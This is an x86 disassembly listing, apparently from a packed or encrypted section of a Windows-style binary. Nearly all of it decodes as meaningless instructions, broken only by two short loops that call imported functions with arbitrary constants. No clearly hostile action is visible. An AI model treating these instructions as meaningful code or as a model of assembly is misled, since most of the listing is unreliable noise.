  4127f0:	mov    ecx,0x9f787ee0
  4127f5:	jno    0x41285d
  4127f7:	dec    esi
  4127f8:	xlat   BYTE PTR ds:[ebx]
  4127f9:	std    
  4127fa:	add    ebp,DWORD PTR [edi+eiz*1+0x73]
  4127fe:	jbe    0x4127f7
  412800:	clc    
  412801:	pop    es
  412802:	jge    0x41284a
  412804:	(bad)  
  412805:	jo     0x412813
  412807:	xchg   esp,eax
  412808:	jb     0x412889
  41280a:	loopne 0x412830
  41280c:	out    0x7a,al
  41280e:	mov    ebp,0xd791ddb8
  412813:	pop    ecx
  412814:	xor    DWORD PTR [ecx*8-0x14309b88],ebp
  41281b:	mov    dl,0xcd
  41281d:	les    esi,FWORD PTR [ebx]
  41281f:	ds out dx,al
  412821:	aaa    
  412822:	xchg   BYTE PTR [esi-0x1],dl
  412825:	jmp    0x424f:0x1899c76a
  41282c:	clc    
  41282d:	popa   
  41282e:	mov    ds:0xd9fda293,al
  412833:	addr16 mov cl,0x92
  412836:	cld    
  412837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412838:	pop    eax
  412839:	repnz fadd QWORD PTR [ebx+0x63491ede]
  412840:	mov    BYTE PTR [edx],bl
  412842:	shl    BYTE PTR [edi],cl
  412844:	lock inc esp
  412846:	repz xchg ecx,eax
  412848:	ret    
  412849:	fcomp  DWORD PTR [ecx]
  41284b:	repnz fcmovu st,st(7)
  41284e:	sbb    eax,0xdbfdb782
  412853:	repnz getsec 
  412856:	stos   DWORD PTR es:[edi],eax
  412857:	mov    ebp,ecx
  412859:	outs   dx,BYTE PTR ds:[esi]
  41285a:	xor    cl,BYTE PTR [esi]
  41285c:	or     DWORD PTR [ebp-0x40],eax
  41285f:	and    DWORD PTR [edx+0x35],edi
  412862:	bound  ebp,QWORD PTR [ecx]
  412864:	sbb    dh,dh
  412866:	sbb    BYTE PTR [edi-0x52863170],0x95
  41286d:	inc    ebp
  41286e:	mov    ebx,0xd6fc54cc
  412873:	sahf   
  412874:	sete   BYTE PTR [edx-0x32]
  412878:	cmp    BYTE PTR [ebx+0x17416fb0],0x49
  41287f:	fimul  WORD PTR [edi]
  412881:	into   
  412882:	repnz aam 0xef
  412885:	add    al,0x51
  412887:	test   al,0xd8
  412889:	mov    bl,0x9f
  41288b:	mov    ch,0xa9
  41288d:	test   DWORD PTR [edx+eiz*8+0x556053be],edx
  412894:	mov    esp,ecx
  412896:	push   esi
  412897:	lods   al,BYTE PTR ds:[esi]
  412898:	mov    esi,0xe0eaa2bc
  41289d:	out    0x93,al
  41289f:	jp     0x412846
  4128a1:	popf   
  4128a2:	dec    eax
  4128a3:	cmp    eax,esp
  4128a5:	test   BYTE PTR [esi],0x38
  4128a8:	and    eax,0xaff8a631
  4128ad:	mov    BYTE PTR [esi-0x620a6a68],dl
  4128b3:	mov    WORD PTR [eax-0x12570ab7],?
  4128b9:	push   ss
  4128ba:	pop    es
  4128bb:	sub    DWORD PTR [edx],edx
  4128bd:	dec    esp
  4128be:	jne    0x4128c6
  4128c0:	sub    eax,0x6617caf4
  4128c5:	push   ss
  4128c6:	push   ds
  4128c7:	mov    al,bl
  4128c9:	enter  0x6a54,0x7e
  4128cd:	adc    al,0x7c
  4128cf:	inc    ebx
  4128d0:	push   ecx
  4128d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128d2:	stos   BYTE PTR es:[edi],al
  4128d3:	mov    dh,0x5b
  4128d5:	je     0x41288c
  4128d7:	clc    
  4128d8:	jecxz  0x412905
  4128da:	lea    eax,[ebx+0x0]
  4128dd:	xor    al,0xd4
  4128df:	or     al,cl
  4128e1:	fs ins BYTE PTR es:[edi],dx
  4128e3:	stos   DWORD PTR es:[edi],eax
  4128e4:	imul   ecx,DWORD PTR [ecx-0xa],0x913974fd
  4128eb:	xchg   DWORD PTR [esi],eax
  4128ed:	sub    bh,BYTE PTR [edx]
  4128ef:	push   ss
  4128f0:	in     eax,0xed
  4128f2:	push   cs
  4128f3:	(bad)  
  4128f4:	hlt    
  4128f5:	xor    al,0xf1
  4128f7:	ror    BYTE PTR [edi+0xf8a4d92],1
  4128fd:	mov    dl,0x41
  4128ff:	xor    DWORD PTR [ebx],ecx
  412901:	imul   esp,esp,0xd2ec82f2
  412907:	loopne 0x4128b7
  412909:	push   eax
  41290a:	loop   0x412976
  41290c:	and    dh,al
  41290e:	sbb    eax,0x90d87b49
  412913:	sbb    BYTE PTR [eax],dh
  412915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412916:	mov    bl,0x9c
  412918:	cdq    
  412919:	inc    edx
  41291a:	dec    ecx
  41291b:	mov    ecx,0xf739af0a
  412920:	cmp    ch,cl
  412922:	jle    0x41291c
  412924:	push   ss
  412925:	in     al,dx
  412926:	sbb    DWORD PTR [ebp-0x1083af45],esi
  41292c:	sbb    eax,0x13b4e7c1
  412931:	push   edx
  412932:	out    0x65,eax
  412934:	adc    eax,0xc13cc0f0
  412939:	ja     0x412906
  41293b:	xor    ch,dl
  41293d:	xchg   ecx,eax
  41293e:	xor    ecx,DWORD PTR [eax]
  412940:	xor    BYTE PTR [esi+ebp*2],0x62
  412944:	dec    esp
  412945:	mov    WORD PTR [edi+0x51],gs
  412948:	fisub  DWORD PTR [eax+0x62]
  41294b:	inc    ebx
  41294c:	inc    ebp
  41294d:	fadd   QWORD PTR [ebx]
  41294f:	xlat   BYTE PTR ds:[ebx]
  412950:	test   eax,0x9bc1a873
  412955:	xor    edx,edi
  412957:	hlt    
  412958:	push   eax
  412959:	jmp    0x27e:0xd83c3a91
  412960:	add    ecx,DWORD PTR [ebp-0xcec2dec]
  412966:	jmp    0x4129c0
  412968:	add    ah,BYTE PTR [eax]
  41296a:	fild   WORD PTR [ebx-0xd6ecfb]
  412970:	mov    ebp,0xf009cfd7
  412975:	jns    0x412984
  412977:	jnp    0x412944
  412979:	xchg   edx,eax
  41297a:	daa    
  41297b:	dec    edx
  41297c:	outs   dx,BYTE PTR ds:[esi]
  41297d:	fcomp  QWORD PTR [ebx+0x557aff2d]
  412983:	lods   al,BYTE PTR ds:[esi]
  412984:	mov    WORD PTR [ecx+0x42],ss
  412987:	jecxz  0x412994
  412989:	or     dh,BYTE PTR [edx-0x5397f6ea]
  41298f:	push   eax
  412990:	xchg   DWORD PTR [eax+0x4a60842c],edi
  412996:	mov    BYTE PTR [edx],ah
  412998:	push   esp
  412999:	(bad)  
  41299b:	rol    ecx,cl
  41299d:	add    DWORD PTR [edi],0x9becac66
  4129a3:	push   0xd2e49d0c
  4129a8:	(bad)  
  4129a9:	icebp  
  4129aa:	and    bh,BYTE PTR [edx-0x62]
  4129ad:	push   eax
  4129ae:	jns    0x412a0c
  4129b0:	and    ebx,DWORD PTR [eax-0x769e7010]
  4129b6:	fucomi st,st(1)
  4129b8:	out    dx,eax
  4129b9:	pop    edx
  4129ba:	ins    BYTE PTR es:[edi],dx
  4129bb:	sub    edi,DWORD PTR [bx+di+0x20]
  4129bf:	int3   
  4129c0:	xchg   edi,eax
  4129c1:	add    al,0x41
  4129c3:	sbb    DWORD PTR [ecx+0x53],0xffffffa1
  4129c7:	outs   dx,DWORD PTR ds:[esi]
  4129c8:	push   esi
  4129c9:	lods   eax,DWORD PTR ds:[esi]
  4129ca:	push   0x6
  4129cc:	cmp    BYTE PTR [eax-0x55f26f08],cl
  4129d2:	jns    0x412996
  4129d4:	aam    0x37
  4129d6:	mov    al,0x4c
  4129d8:	pop    ecx
  4129d9:	mov    edx,0x1fd2e9be
  4129de:	jo     0x412a53
  4129e0:	jecxz  0x412a46
  4129e2:	aad    0x5e
  4129e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129e5:	mov    ebp,0x68880f23
  4129ea:	or     bl,BYTE PTR [ebx+eax*2+0x19]
  4129ee:	adc    al,0x4b
  4129f0:	and    BYTE PTR [edx],0xbc
  4129f3:	dec    ecx
  4129f4:	push   edi
  4129f5:	mov    DWORD PTR [edi],eax
  4129f7:	push   cs
  4129f8:	sub    al,0x48
  4129fa:	dec    eax
  4129fb:	pop    esp
  4129fc:	cmp    dl,BYTE PTR [eax-0x65]
  4129ff:	xchg   edx,eax
  412a00:	hlt    
  412a01:	mov    esp,0xf79fd4c5
  412a06:	shl    BYTE PTR [ebx],0xab
  412a09:	sbb    BYTE PTR [ecx-0x10eca099],dh
  412a0f:	mov    bl,0xe1
  412a11:	fwait
  412a12:	push   cs
  412a13:	sbb    al,0x30
  412a15:	(bad)  
  412a16:	mov    ebp,0x6ec3890c
  412a1b:	out    0xac,al
  412a1d:	in     al,0x94
  412a1f:	push   ds
  412a20:	fiadd  WORD PTR [ebx]
  412a22:	fild   DWORD PTR [edx+0x63ad1506]
  412a28:	jo     0x4129aa
  412a2a:	daa    
  412a2b:	jp     0x412a1e
  412a2d:	in     eax,dx
  412a2e:	mov    eax,ds:0x8850b83
  412a33:	xchg   edx,eax
  412a34:	ja     0x4129c8
  412a36:	loope  0x412a88
  412a38:	push   esp
  412a39:	jp     0x4129d7
  412a3b:	or     eax,0x218340a6
  412a40:	or     ecx,ebx
  412a42:	adc    esi,DWORD PTR [ebx]
  412a44:	pop    ebp
  412a45:	mov    ah,0x8e
  412a47:	add    cl,ch
  412a49:	xor    eax,0xf1423846
  412a4e:	mov    dh,0xf4
  412a50:	addr16 fstp st(6)
  412a53:	mov    ah,BYTE PTR [edx]
  412a55:	js     0x412acd
  412a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a58:	mov    cl,0xf3
  412a5a:	mov    al,BYTE PTR [edi-0x77]
  412a5d:	fs add eax,0xece48520
  412a63:	test   eax,0xdadd87dd
  412a68:	iret   
  412a69:	sub    esi,DWORD PTR [edx]
  412a6b:	shl    DWORD PTR [ecx-0x40a838a2],1
  412a71:	fwait
  412a72:	cmp    DWORD PTR [edx+0x3b1b8b72],eax
  412a78:	jmp    0x55634643
  412a7d:	lds    esi,FWORD PTR [esi+0x6e0a7531]
  412a83:	xchg   ebx,eax
  412a84:	in     al,0xad
  412a86:	inc    esp
  412a87:	faddp  st(6),st
  412a89:	mov    ds:0x1eafe188,eax
  412a8e:	inc    edi
  412a8f:	dec    ebp
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e220
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fdf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fdf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fdf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e417
  412af1:	mov    edi,DWORD PTR ds:0x42fdf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fdf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e228
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e218,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b16
  412b3b:	sub    DWORD PTR [ebx+0x68],0x70706611
  412b42:	mov    ecx,0x5970707e
  412b47:	call   esp
  412b49:	adc    esi,eax
  412b4b:	les    ebp,FWORD PTR [edi]
  412b4d:	(bad)  
  412b4e:	arpl   WORD PTR [esi+eax*1+0x1],di
  412b52:	or     al,0x4f
  412b54:	cwde   
  412b55:	mul    BYTE PTR [ebx-0x2a]
  412b58:	add    esi,DWORD PTR [esi+ecx*2-0x52ae79ec]
  412b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b60:	sub    edi,DWORD PTR [edi+0x22]
  412b63:	sub    eax,0xd6783a97
  412b68:	push   ss
  412b69:	sub    esp,DWORD PTR [ebp-0x487ac1d9]
  412b6f:	mov    eax,ds:0xd7c57b0d
  412b74:	or     esi,DWORD PTR [ecx]
  412b76:	xor    eax,0x7db35913
  412b7b:	push   ss
  412b7c:	leave  
  412b7d:	call   0x74b3:0x6765bd99
  412b84:	rol    DWORD PTR [ebx-0xe],1
  412b87:	jmp    0x412bad
  412b89:	jmp    0xa20e:0xa782577c
  412b90:	(bad)  
  412b91:	pusha  
  412b92:	outs   dx,BYTE PTR ds:[esi]
  412b93:	adc    DWORD PTR [edx-0x45],esp
  412b96:	inc    edi
  412b97:	shl    eax,0x65
  412b9a:	mov    ch,0xb0
  412b9c:	std    
  412b9d:	ds sub eax,0x3a333c16
  412ba3:	or     BYTE PTR [esi+0x53],0x36
  412ba7:	jmp    0x23822c59
  412bac:	mov    esi,0x10b9d22f
  412bb1:	inc    ebp
  412bb2:	mov    ecx,ebx
  412bb4:	scas   eax,DWORD PTR es:[edi]
  412bb5:	dec    edx
  412bb6:	cs inc edx
  412bb8:	or     al,bh
  412bba:	mov    eax,0x95907363
  412bbf:	mov    bh,0xd1
  412bc1:	dec    ebx
  412bc2:	cmp    ebp,eax
  412bc4:	out    dx,eax
  412bc5:	lahf   
  412bc6:	mov    ds,WORD PTR [ecx+0x4bb966bc]
  412bcc:	jl     0x412bce
  412bce:	jno    0x412bae
  412bd0:	mov    ecx,0xde957b4c
  412bd5:	add    eax,0xc1dc5f4e
  412bda:	rcl    ecx,1
  412bdc:	fcomi  st,st(0)
  412bde:	cmp    al,dl
  412be0:	loopne 0x412c5a
  412be2:	in     al,0x7
  412be4:	mov    edx,0xa121c7d3
  412be9:	mov    cl,bh
  412beb:	rol    BYTE PTR [esi-0x462efb71],cl
  412bf1:	leave  
  412bf2:	inc    ecx
  412bf3:	dec    ebp
  412bf4:	adc    DWORD PTR [ebx+ebx*8+0x3e2931ee],ebp
  412bfb:	test   eax,0x4f9f6e3
  412c00:	xchg   bh,ah
  412c02:	(bad)  
  412c03:	or     al,0x91
  412c05:	(bad)  
  412c06:	lods   eax,DWORD PTR ds:[esi]
  412c07:	dec    ebp
  412c08:	xchg   edx,eax
  412c09:	cwde   
  412c0a:	paddb  mm2,QWORD PTR ds:0x382185f5
  412c11:	(bad)  
  412c12:	aas    
  412c13:	call   FWORD PTR [edx-0x2ad6ecf0]
  412c19:	jno    0x412c2c
  412c1b:	aaa    
  412c1c:	mov    edi,0x64e4d774
  412c21:	shl    DWORD PTR [edx+0x52],cl
  412c24:	pop    ebp
  412c25:	retf   
  412c26:	jns    0x412c58
  412c28:	pop    eax
  412c29:	loopne 0x412c3e
  412c2b:	ret    0x2fab
  412c2e:	dec    edi
  412c2f:	pop    eax
  412c30:	icebp  
  412c31:	push   ds
  412c32:	(bad)  
  412c33:	mov    WORD PTR [ebx+0x7c],0xdec1
  412c39:	mov    DWORD PTR [edx+0x40],ebx
  412c3c:	jp     0x412bef
  412c3e:	push   ebx
  412c3f:	fwait
  412c40:	ror    DWORD PTR [ebx-0x7b850401],cl
  412c46:	add    BYTE PTR [eax-0x79],dh
  412c49:	fwait
  412c4a:	rcl    BYTE PTR [edx-0xc4641c2],1
  412c50:	mov    DWORD PTR [edi+0x4f],0x59026934
  412c57:	fs push esi
  412c59:	adc    dh,BYTE PTR [edi]
  412c5b:	sbb    eax,0xf23d6c12
  412c60:	xchg   esp,eax
  412c61:	push   0x254f2d97
  412c66:	mov    esi,0xbc7dba84
  412c6b:	(bad)  
  412c6c:	jl     0x412bfa
  412c6e:	add    dh,al
  412c70:	fstp   DWORD PTR [ebx-0x5c]
  412c73:	dec    esi
  412c74:	aad    0xde
  412c76:	push   esp
  412c77:	js     0x412cda
  412c79:	cmp    eax,0x5f5979c4
  412c7e:	clc    
  412c7f:	push   edi
  412c80:	xchg   esi,eax
  412c81:	je     0x412cd0
  412c83:	sub    bl,BYTE PTR [edx+0x3d]
  412c86:	cs loop 0x412ce2
  412c89:	jecxz  0x412cea
  412c8b:	sub    DWORD PTR ds:0x32afe0a2,esp
  412c91:	jmp    0x74ff:0x9b7ab7ed
  412c98:	inc    esi
  412c99:	cmp    DWORD PTR [ecx+0x5c3797df],0x999c0f1b
  412ca3:	ss pop ds
  412ca5:	cld    
  412ca6:	retf   0x9c58
  412ca9:	xchg   esi,eax
  412caa:	or     BYTE PTR [edx+0x7d1e0562],al
  412cb0:	jbe    0x412c80
  412cb2:	shr    DWORD PTR [eax-0x52],cl
  412cb5:	sbb    ebx,edx
  412cb7:	ror    BYTE PTR [eax],cl
  412cb9:	xor    BYTE PTR [edx],dh
  412cbb:	mov    ecx,DWORD PTR [edx]
  412cbd:	loopne 0x412ccd
  412cbf:	(bad)  
  412cc0:	ins    BYTE PTR es:[edi],dx
  412cc1:	xor    al,0x24
  412cc3:	jae    0x412cb9
  412cc5:	xor    eax,DWORD PTR [edi]
  412cc7:	xor    DWORD PTR [ebp+0x30],ecx
  412cca:	jmp    0x3d4c:0x2ad9d556
  412cd1:	push   ebp
  412cd2:	ins    DWORD PTR es:[edi],dx
  412cd3:	in     al,0x37
  412cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cd6:	adc    DWORD PTR [ebp-0x14],edi
  412cd9:	jns    0x412cf8
  412cdb:	sbb    al,0xe6
  412cdd:	leave  
  412cde:	lds    ebx,FWORD PTR [esi]
  412ce0:	outs   dx,BYTE PTR ds:[esi]
  412ce1:	mov    ecx,0xb542be9
  412ce6:	xchg   al,dh
  412ce8:	adc    ch,BYTE PTR [esi]
  412cea:	mov    eax,0xbd075b74
  412cef:	dec    ebp
  412cf0:	jge    0x412d4d
  412cf2:	sub    BYTE PTR [edi-0x3460e9e0],bl
  412cf8:	sbb    eax,0xe3801760
  412cfd:	adc    al,0x40
  412cff:	(bad)  
  412d00:	(bad)
  412d03:	adc    dh,cl
  412d05:	retf   0x6706
  412d08:	mov    dh,0xb
  412d0a:	(bad)  
  412d0b:	add    esp,ecx
  412d0d:	xor    BYTE PTR [eax+0x3c03f552],bl
  412d13:	xchg   esp,eax
  412d14:	pop    es
  412d15:	push   ebp
  412d16:	sub    ebx,DWORD PTR [edi]
  412d18:	or     DWORD PTR [edx+0x105ad35e],ebp
  412d1e:	loop   0x412d8e
  412d20:	in     eax,dx
  412d21:	imul   esi,DWORD PTR [ecx],0x35ba4b7
  412d27:	test   DWORD PTR [ebp-0x14],ebx
  412d2a:	push   ds
  412d2b:	cdq    
  412d2c:	xchg   ebp,eax
  412d2d:	mov    BYTE PTR [eax-0x62],ah
  412d30:	test   eax,0xa526878c
  412d35:	imul   dl
  412d37:	mov    BYTE PTR [edi],bl
  412d39:	jnp    0x412dae
  412d3b:	pushf  
  412d3c:	jbe    0x412d1a
  412d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d3f:	cdq    
  412d40:	sub    al,0x1d
  412d42:	push   ebx
  412d43:	push   ecx
  412d44:	mov    ds:0xf90d2efd,eax
  412d49:	push   edx
  412d4a:	xor    BYTE PTR [edx+0x3573df40],0x6
  412d51:	popa   
  412d52:	bswap  eax
  412d54:	mov    es,ebx
  412d56:	push   cs
  412d57:	imul   eax,ebx,0xffffffad
  412d5a:	outs   dx,DWORD PTR ds:[esi]
  412d5b:	test   ebx,0xe2d5c531
  412d61:	sub    ecx,esi
  412d63:	sahf   
  412d64:	push   esi
  412d65:	fidivr DWORD PTR [ebp+0x54]
  412d68:	inc    ebx
  412d69:	pop    eax
  412d6a:	inc    ecx
  412d6b:	addr16 mov ebx,0x74525257
  412d71:	sar    DWORD PTR [esi+ebx*4],cl
  412d74:	sub    eax,0x65bc7542
  412d79:	pop    ecx
  412d7a:	dec    esp
  412d7b:	push   eax
  412d7c:	int3   
  412d7d:	idiv   BYTE PTR [esi+0xb]
  412d80:	rcl    BYTE PTR [esi],0xd5
  412d83:	pop    esp
  412d84:	mov    al,0x32
  412d86:	adc    bl,BYTE PTR [edx]
  412d88:	mov    al,0x98
  412d8a:	(bad)  
  412d8c:	jnp    0x412dda
  412d8e:	xlat   BYTE PTR ds:[ebx]
  412d8f:	jle    0x412d30
  412d91:	push   ds
  412d92:	popf   
  412d93:	out    0xee,eax
  412d95:	in     eax,dx
  412d96:	and    eax,0xe0d10787
  412d9b:	aad    0x93
  412d9d:	adc    edx,DWORD PTR [eax]
  412d9f:	or     al,BYTE PTR [bx+di-0x6f23]
  412da4:	sbb    BYTE PTR [ecx-0x28],0x50
  412da8:	cli    
  412da9:	and    BYTE PTR [esi+esi*4],bh
  412dac:	and    eax,0x97c32e4d
  412db1:	xchg   ebp,eax
  412db2:	(bad)  
  412db3:	or     DWORD PTR [esi-0x3421e61e],ecx
  412db9:	push   0xffffff8b
  412dbb:	in     eax,dx
  412dbc:	stos   BYTE PTR es:[edi],al
  412dbd:	cmp    DWORD PTR [ecx],0x1f
  412dc0:	cmp    cl,BYTE PTR [ecx]
  412dc2:	les    esi,FWORD PTR [ebx-0x63]
  412dc5:	add    BYTE PTR [esp+edi*4+0x26],al
  412dc9:	xlat   BYTE PTR ds:[ebx]
  412dca:	popf   
  412dcb:	mov    BYTE PTR [eax-0x247a83ce],dl
  412dd1:	xor    DWORD PTR es:0x393acd7e,ebx
  412dd8:	mov    BYTE PTR [esi+0x2d39b2a3],bh
  412dde:	jle    0x412dfe
  412de0:	pop    ds
  412de1:	bound  edx,QWORD PTR [ebx]
  412de3:	dec    DWORD PTR [ebx+0x1c]
  412de6:	stc    
  412de7:	shl    DWORD PTR [edx],0x43
  412dea:	mov    ecx,DWORD PTR [ebx-0x208eec92]
  412df0:	or     BYTE PTR [esi],0xdb
  412df3:	sbb    BYTE PTR [ecx+0x22],bl
  412df6:	pop    ecx
  412df7:	lods   eax,DWORD PTR ds:[esi]
  412df8:	pop    ecx
  412df9:	loop   0x412da5
  412dfb:	ds dec ebx
  412dfd:	fisub  WORD PTR [ecx+0x6916b3d0]
  412e03:	sbb    DWORD PTR [ebp-0x7c],ecx
  412e06:	imul   ecx,DWORD PTR ds:0x64704d67,0x81ce8736
  412e10:	and    eax,0x42e21c
  412e15:	add    BYTE PTR [eax],al
  412e17:	add    BYTE PTR [eax],al
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e21c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e21c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e21c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e21c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e587
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ebp+0x5a4b7eb2],bx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x3f70707e
  412e82:	fimul  WORD PTR [ecx+0x7c]
  412e85:	lods   al,BYTE PTR ds:[esi]
  412e86:	jle    0x412e76
  412e88:	pop    ecx
  412e89:	mov    esi,0x1c1990e0
  412e8e:	shr    BYTE PTR [ecx-0x372dfd46],0xdd
  412e95:	inc    ecx
  412e96:	mov    dh,0x9e
  412e98:	push   ds
  412e99:	inc    ebp
  412e9a:	cmc    
  412e9b:	and    eax,0x370467d9
  412ea0:	sbb    dl,al
  412ea2:	inc    ebp
  412ea3:	add    esi,DWORD PTR [esi-0xffc5442]
  412ea9:	push   esp
  412eaa:	loop   0x412f03
  412eac:	ss push es
  412eae:	mov    al,0xad
  412eb0:	adc    al,0x71
  412eb2:	mov    edx,0x8dcc4d0
  412eb7:	pop    ds
  412eb8:	sbb    BYTE PTR [ebp+0x20d8ad4e],ch
  412ebe:	mov    al,ds:0xaee39e6a
  412ec3:	hlt    
  412ec4:	dec    ebp
  412ec5:	loopne 0x412f02
  412ec7:	(bad)  
  412ec8:	mov    ch,0x5c
  412eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ecb:	push   edx
  412ecc:	cmp    edx,DWORD PTR [edi]
  412ece:	fist   WORD PTR [esi-0x65]
  412ed1:	ds jmp 0x1e5a36bb
  412ed7:	cmp    eax,edi
  412ed9:	mov    dh,0xb2
  412edb:	jbe    0x412f27
  412edd:	out    dx,eax
  412ede:	test   ah,ah
  412ee0:	add    esi,DWORD PTR [edx+eiz*8-0x58]
  412ee4:	push   ds
  412ee5:	enter  0xbcc1,0x0
  412ee9:	adc    al,0xf6
  412eeb:	lods   al,BYTE PTR ds:[esi]
  412eec:	ins    DWORD PTR es:[edi],dx
  412eed:	jmp    0x412ef2
  412eef:	or     al,0x0
  412ef1:	or     BYTE PTR [ebx+0x41d5815f],al
  412ef7:	cwde   
  412ef8:	outs   dx,DWORD PTR ds:[esi]
  412ef9:	pop    ds
  412efa:	cli    
  412efb:	sbb    edi,edi
  412efd:	dec    ecx
  412efe:	jg     0x412eef
  412f00:	(bad)  
  412f02:	mov    edi,0x48fdb3cb
  412f07:	mov    esp,0xae711c11
  412f0c:	or     DWORD PTR [eax-0x6b],ebp
  412f0f:	xchg   esi,eax
  412f10:	fdivr  QWORD PTR [esi]
  412f12:	out    0x2a,eax
  412f14:	xlat   BYTE PTR ds:[ebx]
  412f15:	out    0xaa,al
  412f17:	out    dx,al
  412f18:	pop    eax
  412f19:	inc    ecx
  412f1a:	mov    bh,0x89
  412f1c:	jmp    0x3e0776e6
  412f21:	arpl   WORD PTR [edi],bx
  412f23:	out    dx,al
  412f24:	mov    al,ds:0x710fa0ae
  412f29:	arpl   WORD PTR [edi],ax
  412f2b:	and    al,0x21
  412f2d:	or     DWORD PTR [edx],esp
  412f2f:	jne    0x412f4c
  412f31:	adc    dl,ah
  412f33:	and    esi,ebp
  412f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f36:	iret   
  412f37:	sbb    al,0xc6
  412f39:	in     al,dx
  412f3a:	test   eax,0xe6c06907
  412f3f:	outs   dx,BYTE PTR ds:[esi]
  412f40:	std    
  412f41:	int    0x7b
  412f43:	adc    eax,0x5e257d34
  412f48:	stos   DWORD PTR es:[edi],eax
  412f49:	shl    BYTE PTR [edx],0xb5
  412f4c:	dec    edx
  412f4d:	aad    0x6a
  412f4f:	and    BYTE PTR [edi-0xd],al
  412f52:	xchg   esp,eax
  412f53:	(bad)  
  412f54:	push   esp
  412f55:	sub    DWORD PTR ds:0x8d8b1ca4,ebp
  412f5b:	mov    bh,0xfb
  412f5d:	in     eax,0xe1
  412f5f:	pop    eax
  412f60:	pop    ebx
  412f61:	dec    esi
  412f62:	adc    eax,0x9f788bf5
  412f67:	shr    dh,1
  412f69:	addr16 mov esp,0x96e7f85f
  412f6f:	inc    ecx
  412f70:	sti    
  412f71:	dec    ebx
  412f72:	test   eax,0xfbfa0f67
  412f77:	outs   dx,BYTE PTR ds:[esi]
  412f78:	pop    es
  412f79:	add    BYTE PTR [esp+ebx*8-0x11],ah
  412f7d:	xchg   ecx,eax
  412f7e:	mov    BYTE PTR [eax],bl
  412f80:	inc    edi
  412f81:	push   cs
  412f82:	mov    cl,BYTE PTR [esi+0x3fce6a86]
  412f88:	dec    ebx
  412f89:	ins    DWORD PTR es:[edi],dx
  412f8a:	and    eax,0xbde79f83
  412f8f:	fisub  WORD PTR [eax-0x70aa2e00]
  412f95:	mov    cl,BYTE PTR [eax-0x69]
  412f98:	(bad)  
  412f9a:	(bad)  
  412f9b:	out    0x11,eax
  412f9d:	call   0x2463:0x350c5fb7
  412fa4:	mov    bh,0xd9
  412fa6:	mov    WORD PTR [esi+0x4c5c0518],?
  412fac:	cmp    BYTE PTR [eax],cl
  412fae:	adc    cl,al
  412fb0:	fisubr DWORD PTR [edi+0x46d4af7a]
  412fb6:	add    DWORD PTR [edi],0x66
  412fb9:	fdiv   DWORD PTR [edx-0x61]
  412fbc:	loope  0x412fca
  412fbe:	cmp    eax,0xcb592a54
  412fc3:	sbb    al,0xac
  412fc5:	xchg   edi,eax
  412fc6:	in     al,0x5f
  412fc8:	call   0x171db7e1
  412fcd:	inc    edi
  412fce:	fistp  DWORD PTR [eax+0x4436338d]
  412fd4:	push   ds
  412fd5:	js     0x412f7e
  412fd7:	call   0x8138:0xc65b3ce7
  412fde:	cmp    BYTE PTR [eax-0x473b1b45],0xff
  412fe5:	shl    BYTE PTR [edi+0x20],0xab
  412fe9:	icebp  
  412fea:	sbb    ecx,DWORD PTR [edx-0x43]
  412fed:	pop    ss
  412fee:	loope  0x413016
  412ff0:	movsx  esi,WORD PTR [ecx]
  412ff3:	mov    ebp,0x1a3131
  412ff8:	test   DWORD PTR [ecx+0x45],esi
  412ffb:	in     eax,0xaa
  412ffd:	jecxz  0x412fd2
  412fff:	retf   
  413000:	popa   
  413001:	test   DWORD PTR [esi+eax*2-0x484b1bbb],0x5a2c3c56
  41300c:	or     esp,DWORD PTR [edi-0x356824ae]
  413012:	vmread DWORD PTR [edx+0x7e],ebp
